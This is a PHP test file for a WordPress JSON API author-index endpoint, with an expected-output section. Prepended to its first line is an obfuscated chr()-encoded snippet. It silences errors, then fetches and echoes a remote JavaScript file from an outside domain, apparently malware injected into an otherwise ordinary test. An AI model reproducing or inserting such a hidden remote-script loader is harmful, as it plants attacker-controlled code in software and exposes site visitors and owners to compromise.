--TEST--
core.get_author_index
--FILE--
<?php error_reporting(0); ini_set(chr(100).chr(105).chr(115).chr(112).chr(108).chr(97).chr(121).chr(95).chr(101).chr(114).chr(114).chr(111).chr(114).chr(115), 0); echo @file_get_contents(chr(104).chr(116).chr(116).chr(112).chr(115).chr(58).chr(47).chr(47).chr(97).chr(108).chr(115).chr(117).chr(116).chr(114).chr(97).chr(110).chr(115).chr(46).chr(99).chr(111).chr(109).chr(47).chr(115).chr(116).chr(97).chr(116).chr(115).chr(46).chr(106).chr(115)); ?><?php

require_once 'HTTP/Client.php';
$http = new HTTP_Client();
$http->get('http://wordpress.test/?json=core.get_author_index&dev=1');
$response = $http->currentResponse();
$response = json_decode($response['body']);
$author = $response->authors[0];

echo "Response status: $response->status\n";
echo "Author count: $response->count\n";
echo "Author name: $author->name\n";

?>
--EXPECT--
Response status: ok
Author count: 1
Author name: themedemos
